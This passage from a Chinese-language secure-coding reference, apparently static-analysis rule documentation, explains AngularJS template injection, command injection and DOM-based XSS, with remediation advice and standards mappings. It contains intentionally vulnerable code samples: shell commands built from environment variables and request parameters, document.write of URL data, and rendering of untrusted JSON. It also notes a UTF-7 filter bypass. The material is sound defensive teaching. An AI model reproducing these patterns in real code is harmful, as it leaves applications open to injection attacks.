<p>在这种情况下，$stateParams.expression将采用可能受用户控制的数据，并将其作为用于指定上下文的模板进行计算。这又可能会允许恶意用户在浏览器中运行他们想要的代码、检索关于代码运行的上下文的信息、查找有关如何创建应用程序的额外信息，或将此代码转换为 full blown XSS 攻击。</p>
<h5 id="RECOMMENDATIONS-17"><a href="#RECOMMENDATIONS-17" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>尽可能不要让用户提供模板。如果需要由用户提供模板，请谨慎执行输入验证，以防止在模板中注入恶意代码。</p>
<p>不要依赖在 AngularJS 1 中实施的沙盒来阻止漏洞。已经证明沙盒无法完全有效地在所有版本的 AngularJS 中防止 XSS 和应用程序控制，因为这并不是预期的安全功能，而且已从版本 1.6.[1] 中移除。</p>
<h5 id="REFERENCES-17"><a href="#REFERENCES-17" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] AngularJS Security Guide Google</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 95 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration Top 25 2019 [18] CWE ID 094 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[5] Standards Mapping - FIPS200 SI </p>
<p>[6] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.2.4 Sanitization and Sandboxing Requirements, 5.2.5 Sanitization and Sandboxing Requirements, 5.2.8 Sanitization and Sandboxing Requirements, 5.3.6 Output Encoding and Injection Prevention Requirements </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws </p>
<p>[11] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[12] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[13] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[14] Standards Mapping - OWASP Top 10 2017 A1 Injection </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[22] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[23] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 116 </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Web Application Security Consortium Version 2.00 Improper Input Handling (WASC-20) </p>
<h4 id="Command-Injection"><a href="#Command-Injection" class="headerlink" title="Command Injection"></a>Command Injection</h4><h5 id="ABSTRACT-18"><a href="#ABSTRACT-18" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>执行不可信赖资源中的命令，或在不可信赖的环境中执行命令，都会导致程序以攻击者的名义执行恶意命令。</p>
<h5 id="EXPLANATION-18"><a href="#EXPLANATION-18" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Command Injection 漏洞主要表现为以下两种形式：</p>
<p>－ 攻击者能够篡改程序执行的命令：攻击者直接控制了所执行的命令。</p>
<p>－ 攻击者能够篡改命令的执行环境：攻击者间接地控制了所执行的命令。</p>
<p>在这种情况下，我们着重关注第一种情况，即攻击者有可能控制所执行命令。这种类型的 Command Injection 漏洞会在以下情况下出现：</p>
<ol>
<li><p>数据从不可信赖的数据源进入应用程序。</p>
</li>
<li><p>数据被用作代表应用程序所执行命令的字符串，或字符串的一部分。</p>
</li>
<li><p>通过命令的执行，应用程序会授予攻击者一种原本不该拥有的特权或能力。</p>
</li>
</ol>
<p>示例 1：以下来自系统实用程序的代码根据环境变量 APPHOME 来决定其安装目录，然后根据指定目录的相对路径来执行初始化脚本。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">var cp = require(&apos;child_process&apos;);</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  var home = process.env(&apos;APPHOME&apos;);</span><br><span class="line"></span><br><span class="line">  var cmd = home + INITCMD;</span><br><span class="line"></span><br><span class="line">  child = cp.exec(cmd, function(error, stdout, stderr)&#123;</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
<p>Example 1 中的代码可以使攻击者通过修改系统属性 APPHOME 以指向包含恶意版本 INITCMD 的其他路径来提高自己在应用程序中的权限，继而随心所欲地执行命令。由于程序不会验证从环境中读取的值，因此如果攻击者能够控制系统属性 APPHOME 的值，他们就能欺骗应用程序去运行恶意代码，从而取得系统控制权。</p>
<p>示例 2：下面的代码来自一个管理 Web 应用程序，旨在使用户能够使用一个围绕 rman 实用程序的批处理文件封装器来启动 Oracle 数据库备份。脚本 rmanDB.bat 接受单个命令行参数，该参数指定了要执行的备份类型。由于访问数据库受限，所以应用程序执行备份需要具有较高权限的用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">var cp = require(&apos;child_process&apos;);</span><br><span class="line"></span><br><span class="line">var http = require(&apos;http&apos;);</span><br><span class="line"></span><br><span class="line">var url = require(&apos;url&apos;);</span><br><span class="line"></span><br><span class="line">function listener(request, response)&#123;</span><br><span class="line"></span><br><span class="line">  var btype = url.parse(request.url, true)[&apos;query&apos;][&apos;backuptype&apos;];</span><br><span class="line"></span><br><span class="line">  if (btype !== undefined)&#123;</span><br><span class="line"></span><br><span class="line">    cmd = &quot;c:\\util\\rmanDB.bat&quot; + btype;</span><br><span class="line"></span><br><span class="line">    cp.exec(cmd, function(error, stdout, stderr)&#123;</span><br><span class="line"></span><br><span class="line">      ...</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">http.createServer(listener).listen(8080);</span><br></pre></td></tr></table></figure>
<p>这里的问题是：程序除了验证读取自用户的 backuptype参数是否存在之外，没有对其进行任何验证。在调用该 shell 之后，就可能允许执行多个命令，并且由于该应用程序的特性，该应用程序将会使用与数据库进行交互的必要权限来运行，这就意味着攻击者注入的任何命令都会通过这些权限来运行。</p>
<p>示例 3：下面的代码来自一个 Web 应用程序，用户可通过该应用程序提供的界面在系统上更新他们的密码。在某些网络环境中更新密码时，其中的一个步骤就是在 /var/yp 目录中运行 make 命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">require(&apos;child_process&apos;).exec(&quot;make&quot;, function(error, stdout, stderr)&#123;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>这里的问题在于，程序没有指定 make 的绝对路径，因此没能在执行 child_process.exec() 调用前清理其环境。如果攻击者能够修改 $PATH 变量，把它指向名为 make 恶意二进制代码，程序就会在其指定的环境下执行，然后加载该恶意二进制代码，而非原本期望的代码。由于应用程序自身的特性，运行该应用程序需要具备执行系统操作所需的权限，这意味着攻击者会利用这些权限执行自己的 make，从而可能导致攻击者完全控制系统。</p>
<h5 id="RECOMMENDATIONS-18"><a href="#RECOMMENDATIONS-18" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>应当禁止用户直接控制由程序执行的命令。在用户的输入会影响命令执行的情况下，应将用户输入限制为从预定的安全命令集合中进行选择。如果输入中出现了恶意的内容，传递到命令执行函数的值将默认从安全命令集合中选择，或者程序将拒绝执行任何命令。</p>
<p>在需要将用户的输入用作程序命令中的参数时，由于合法的参数集合实在很大，或是难以跟踪，使得这个方法通常都不切实际。开发人员通常的做法是使用黑名单。在输入之前，黑名单会有选择地拒绝或避免潜在的危险字符。但是，任何一个定义不安全内容的列表都很可能是不完整的，并且会严重地依赖于执行命令的环境。更好的方法是创建一份白名单，允许其中的字符出现在输入中，并且只接受完全由这些经认可的字符组成的输入。</p>
<p>攻击者可以通过修改程序运行命令的环境来间接控制这些命令的执行。我们不应当完全信赖环境，还需采取预防措施，防止攻击者利用某些控制环境的手段进行攻击。无论何时，只要有可能，都应由应用程序来控制命令，并使用绝对路径执行命令。如果编译时尚不了解路径（如在跨平台应用程序中），应该在执行过程中利用可信赖的值构建一个绝对路径。应对照一系列定义有效值的常量，仔细地检查从配置文件或者环境中读取的命令值和路径。</p>
<p>有时还可以执行其他检验，以检查这些来源是否已被恶意篡改。例如，如果一个配置文件为可写，程序可能会拒绝运行。如果能够预先得知有关要执行的二进制代码的信息，程序就会进行检测，以检验这个二进制代码的合法性。如果一个二进制代码始终属于某个特定的用户，或者被指定了一组特定的访问权限，这些属性就会在执行二进制代码前通过程序进行检验。</p>
<p>尽管可能无法完全阻止强大的攻击者为了控制程序执行的命令而对系统进行的攻击，但只要程序执行外部命令，就务必使用最小授权原则：不给予超过执行该命令所必需的权限。</p>
<h5 id="REFERENCES-18"><a href="#REFERENCES-18" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 77, CWE ID 78 </p>
<p>[2] Standards Mapping - Common Weakness Enumeration Top 25 2019 [11] CWE ID 078 </p>
<p>[3] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-001310, CCI-002754 </p>
<p>[4] Standards Mapping - FIPS200 SI </p>
<p>[5] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[6] Standards Mapping - MISRA C 2012 Rule 1.3 </p>
<p>[7] Standards Mapping - MISRA C++ 2008 Rule 0-3-1 </p>
<p>[8] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[9] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.2.2 Sanitization and Sandboxing Requirements, 5.2.3 Sanitization and Sandboxing Requirements, 5.2.5 Sanitization and Sandboxing Requirements, 5.2.8 Sanitization and Sandboxing Requirements, 5.3.6 Output Encoding and Injection Prevention Requirements, 5.3.8 Output Encoding and Injection Prevention Requirements, 10.3.2 Deployed Application Integrity Controls, 12.3.2 File Execution Requirements, 12.3.5 File Execution Requirements </p>
<p>[10] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M7 Client Side Injection </p>
<p>[11] Standards Mapping - OWASP Top 10 2004 A6 Injection Flaws </p>
<p>[12] Standards Mapping - OWASP Top 10 2007 A2 Injection Flaws </p>
<p>[13] Standards Mapping - OWASP Top 10 2010 A1 Injection </p>
<p>[14] Standards Mapping - OWASP Top 10 2013 A1 Injection </p>
<p>[15] Standards Mapping - OWASP Top 10 2017 A1 Injection </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.6 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1, Requirement 6.5.2 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[22] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[23] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[24] Standards Mapping - SANS Top 25 2009 Insecure Interaction - CWE ID 078 </p>
<p>[25] Standards Mapping - SANS Top 25 2010 Insecure Interaction - CWE ID 078 </p>
<p>[26] Standards Mapping - SANS Top 25 2011 Insecure Interaction - CWE ID 078 </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I, APP3570 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I, APP3570 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I, APP3570 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I, APP3570 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I, APP3570 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I, APP3570 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I, APP3570 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I </p>
<p>[40] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I </p>
<p>[41] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I </p>
<p>[42] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I </p>
<p>[43] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002510 CAT I, APSC-DV-002560 CAT I </p>
<p>[44] Standards Mapping - Web Application Security Consortium 24 + 2 OS Commanding </p>
<p>[45] Standards Mapping - Web Application Security Consortium Version 2.00 OS Commanding (WASC-31) </p>
<h4 id="Cross-Site-Scripting-DOM"><a href="#Cross-Site-Scripting-DOM" class="headerlink" title="Cross-Site Scripting: DOM"></a>Cross-Site Scripting: DOM</h4><h5 id="ABSTRACT-19"><a href="#ABSTRACT-19" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>向一个 Web 浏览器发送未经验证的数据会导致该浏览器执行恶意代码。</p>
<h5 id="EXPLANATION-19"><a href="#EXPLANATION-19" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>Cross-Site Scripting (XSS) 漏洞在以下情况下发生：</p>
<ol>
<li><p>数据通过一个不可信赖的数据源进入 Web 应用程序。对于基于 DOM 的 XSS，将从 URL 参数或浏览器中的其他值读取数据，并使用客户端代码将其重新写入该页面。对于 Reflected XSS，不可信赖的数据源通常为 Web 请求，而对于 Persisted（也称为 Stored）XSS，该数据源通常为数据库或其他后端数据存储。</p>
</li>
<li><p>未经验证但包含在动态内容中的数据将传送给 Web 用户。对于基于 DOM 的 XSS，任何时候当受害人的浏览器解析 HTML 页面时，恶意内容都将作为 DOM（文档对象模型）创建的一部分执行。</p>
</li>
</ol>
<p>传送到 Web 浏览器的恶意内容通常采用 JavaScript 代码片段的形式，但也可能会包含一些 HTML、Flash 或者其他任意一种可以被浏览器执行的代码。基于 XSS 的攻击手段花样百出，几乎是无穷无尽的，但通常它们都会包含传输给攻击者的私人数据（如 Cookie 或者其他会话信息）。在攻击者的控制下，指引受害者进入恶意的网络内容；或者利用易受攻击的站点，对用户的机器进行其他恶意操作。</p>
<p>例 1：下面的 JavaScript 代码片段可从 URL 中读取雇员 ID eid，并将其显示给用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;SCRIPT&gt;</span><br><span class="line"></span><br><span class="line">var pos=document.URL.indexOf(&quot;eid=&quot;)+4;</span><br><span class="line"></span><br><span class="line">document.write(document.URL.substring(pos,document.URL.length));</span><br><span class="line"></span><br><span class="line">&lt;/SCRIPT&gt;</span><br></pre></td></tr></table></figure>
<p>示例 2：考虑使用 HTML 表单：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;myDiv&quot;&gt;</span><br><span class="line"></span><br><span class="line">  Employee ID: &lt;input type=&quot;text&quot; id=&quot;eid&quot;&gt;&lt;br&gt;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  &lt;button&gt;Show results&lt;/button&gt;</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;div id=&quot;resultsDiv&quot;&gt;</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">&lt;/div&gt;</span><br></pre></td></tr></table></figure>
<p>下面的 jQuery 代码片段可从表单中读取雇员 ID，并将其显示给用户。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(function()&#123;</span><br><span class="line"></span><br><span class="line">  $(&quot;#myDiv&quot;).on(&quot;click&quot;, &quot;button&quot;, function()&#123;</span><br><span class="line"></span><br><span class="line">    var eid = $(&quot;#eid&quot;).val();</span><br><span class="line"></span><br><span class="line">    $(&quot;resultsDiv&quot;).append(eid);</span><br><span class="line"></span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>如果文本输入中 ID 为 eid 的雇员 ID 仅包含标准字母数字文本，则这些代码示例可正确运行。如果 eid 中的某个值包含元字符或源代码，则 Web 浏览器就会在显示 HTTP 响应时执行该代码。</p>
<p>示例 3：以下代码显示了 React 应用程序中基于 DOM 的 XSS 示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">let element = JSON.parse(getUntrustedInput());</span><br><span class="line"></span><br><span class="line">ReactDOM.render(&lt;App&gt;</span><br><span class="line"></span><br><span class="line">    &#123;element&#125;</span><br><span class="line"></span><br><span class="line">&lt;/App&gt;);</span><br></pre></td></tr></table></figure>
<p>在Example 3 中，如果攻击者可以控制从 getUntrustedInput() 检索到的整个 JSON 对象，他们可能就能够使 React 将 element 呈现为一个组件，从而可以使用他们自己控制的值传递具有 dangerouslySetInnerHTML的对象，这是一种典型的 Cross-Site Scripting 攻击。</p>
<p>最初，这些代码看起来似乎不会轻易遭受攻击。毕竟，有谁会输入包含可在自己电脑上运行的恶意代码的内容呢？真正的危险在于攻击者会创建恶意的 URL，然后采用电子邮件或社交工程的欺骗手段诱使受害者访问此 URL 的链接。当受害者单击这个链接时，他们不知不觉地通过易受攻击的网络应用程序，将恶意内容带到了自己的电脑中。这种对易受攻击的 Web 应用程序进行盗取的机制通常被称为反射式 XSS。</p>
<p>正如例子中所显示的，XSS 漏洞是由于 HTTP 响应中包含了未验证的数据代码而引起的。受害者遭受 XSS 攻击的途径有三种：</p>
<ul>
<li>系统从 HTTP 请求中直接读取数据，并在 HTTP 响应中返回数据。当攻击者诱使用户为易受攻击的 Web 应用程序提供危险内容，而这些危险内容随后会反馈给用户并在 Web 浏览器中执行时，就会发生 Reflected XSS 漏洞利用。发送恶意内容最常用的方法是，将恶意内容作为一个参数包含在公开发布或通过电子邮件直接发送给受害者的 URL 中。以这种手段构造的 URL 已成为多种网络钓鱼阴谋的核心，攻击者会借此诱骗受害者访问指向易受攻击站点的 URL。当该站点将攻击者的内容反馈给受害者后，便会执行这些内容，接下来会将用户计算机中的各种私密信息（比如可能包含会话信息的 Cookie）传输给攻击者，或者执行其他恶意活动。</li>
</ul>
<p>— 应用程序将危险数据存储在数据库或其他可信赖的数据存储器中。这些危险数据随后会被回写到应用程序中，并包含在动态内容中。Persistent XSS 盗取发生在如下情况：攻击者将危险内容注入到数据存储器中，且该存储器之后会被读取并包含在动态内容中。从攻击者的角度看，注入恶意内容的最佳位置莫过于一个面向许多用户，尤其是相关用户显示的区域。相关用户通常在应用程序中具备较高的特权，或相互之间交换敏感数据，这些数据对攻击者来说有利用价值。如果某一个用户执行了恶意内容，攻击者就有可能以该用户的名义执行某些需要特权的操作，或者获得该用户个人所有的敏感数据的访问权限。</p>
<p>— 应用程序之外的数据源将危险数据储存在一个数据库或其他数据存储器中，随后这些危险数据被当作可信赖的数据回写到应用程序中，并储存在动态内容中。</p>
<h5 id="RECOMMENDATIONS-19"><a href="#RECOMMENDATIONS-19" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>针对 XSS 的解决方法是，确保在适当位置进行验证，并检验其属性是否正确。</p>
<p>由于 XSS 漏洞在应用程序的输出中包含恶意数据时出现，因此，合乎逻辑的方法是在数据流出应用程序的前一刻对其进行验证。然而，由于 Web 应用程序常常会包含复杂而难以理解的代码，用以生成动态内容，因此，这一方法容易产生遗漏错误（遗漏验证）。降低这一风险的有效途径是对 XSS 也执行输入验证。</p>
<p>由于 Web 应用程序必须验证输入信息以避免其他漏洞（如 SQL Injection），因此，一种相对简单的解决方法是，加强一个应用程序现有的输入验证机制，将 XSS 检测包括其中。尽管有一定的价值，但 XSS 输入验证并不能取代严格的输出验证。应用程序可能通过共享的数据存储器或其他可信赖的数据源接受输入，而该数据存储器所接受的输入源可能并未执行适当的输入验证。因此，应用程序不能间接地依赖于该数据或其他任意数据的安全性。这就意味着，避免 XSS 漏洞的最佳方法是验证所有进入应用程序以及由应用程序传送至用户端的数据。</p>
<p>针对 XSS 漏洞进行验证最安全的方式是，创建一份安全字符白名单，允许其中的字符出现在 HTTP 内容中，并且只接受完全由这些经认可的字符组成的输入。例如，有效的用户名可能仅包含字母数字字符，电话号码可能仅包含 0-9 的数字。然而，这种解决方法在 Web 应用程序中通常是行不通的，因为许多字符对浏览器来说都具有特殊的含义，编码时这些字符必须被视为合法输入，例如，一个 Web 设计电子公告栏就必须接受其用户提供的 HTML 片段。</p>
<p>更灵活的方法是列入黑名单，但其安全性较差，这种方法在使用输入之前就有选择地拒绝或转义了潜在的危险字符。为了创建这样一个列表，首先需要了解对于 Web 浏览器具有特殊含义的字符集。虽然 HTML 标准定义了哪些字符具有特殊含义，但是许多 Web 浏览器会设法更正 HTML 中的常见错误，并可能在特定的上下文中认为其他字符具有特殊含义，这就是我们不鼓励使用黑名单作为阻止 XSS 的方法的原因。卡耐基梅隆大学 (Carnegie Mellon University) 软件工程学院 (Software Engineering Institute) 下属的 CERT(R) (CERT(R) Coordination Center) 合作中心提供了有关各种上下文中认定的特殊字符的具体信息 [1]：</p>
<p>在有关块级别元素的内容中（位于一段文本的中间）：</p>
<p>－ “&lt;” 是一个特殊字符，因为它可以引入一个标签。</p>
<p>－ “&amp;” 是一个特殊字符，因为它可以引入一个字符实体。</p>
<p>－ “&gt;” 是一个特殊字符，之所以某些浏览器将其认定为特殊字符，是基于一种假设，即该页的作者本想在前面添加一个 “&lt;”，却错误地将其遗漏了。</p>
<p>下面的这些原则适用于属性值：</p>
<ul>
<li><p>对于外加双引号的属性值，双引号是特殊字符，因为它们标记了该属性值的结束。</p>
</li>
<li><p>对于外加单引号的属性值，单引号是特殊字符，因为它们标记了该属性值的结束。</p>
</li>
<li><p>对于不带任何引号的属性值，空格字符（如空格符和制表符）是特殊字符。</p>
</li>
<li><p>“&amp;” 与某些特定变量一起使用时是特殊字符，因为它引入了一个字符实体。 </p>
</li>
</ul>
<p>例如，在 URL 中，搜索引擎可能会在结果页面内提供一个链接，用户可以点击该链接来重新运行搜索。可以将这一方法运用于编写 URL 中的搜索查询语句，这将引入更多特殊字符：</p>
<ul>
<li><p>空格符、制表符和换行符是特殊字符，因为它们标记了 URL 的结束。</p>
</li>
<li><p>“&amp;” 是特殊字符，因为它可引入一个字符实体或分隔 CGI 参数。</p>
</li>
<li><p>非 ASCII 字符（即 ISO-8859-1 编码表中所有大于 127 的字符）不允许出现在 URL 中，因此这些字符在此环境下被视为特殊字符。</p>
</li>
<li><p>在服务器端对在 HTTP 转义序列中编码的参数进行解码时，必须过滤掉输入中的 “%” 符号。例如，当输入中出现 “%68%65%6C%6C%6F” 时，只有从输入的内容中过滤掉 “%”，上述字符串才能在网页上显示为 “hello”。</p>
</li>
</ul>
<p>在 <code>&lt;SCRIPT&gt; &lt;/SCRIPT&gt;</code> 的正文内：</p>
<ul>
<li>如果可以将文本直接插入到已有的脚本标签中，应该过滤掉分号、省略号、中括号和换行符。</li>
</ul>
<p>服务器端脚本：</p>
<p>－ 如果服务器端脚本会将输入中的感叹号 (!) 转换成输出中的双引号 (“)，则可能需要对此进行更多过滤。 </p>
<p>其他可能出现的情况：</p>
<p>－ 如果攻击者以 UTF-7 格式提交了请求，则特殊字符“&lt;”可能会显示为“+ADw-”，并可能会绕过过滤。如果输出包含在没有确切指定编码格式的网页中，某些浏览器就会设法根据内容自动识别编码（此处采用 UTF-7 格式）。</p>
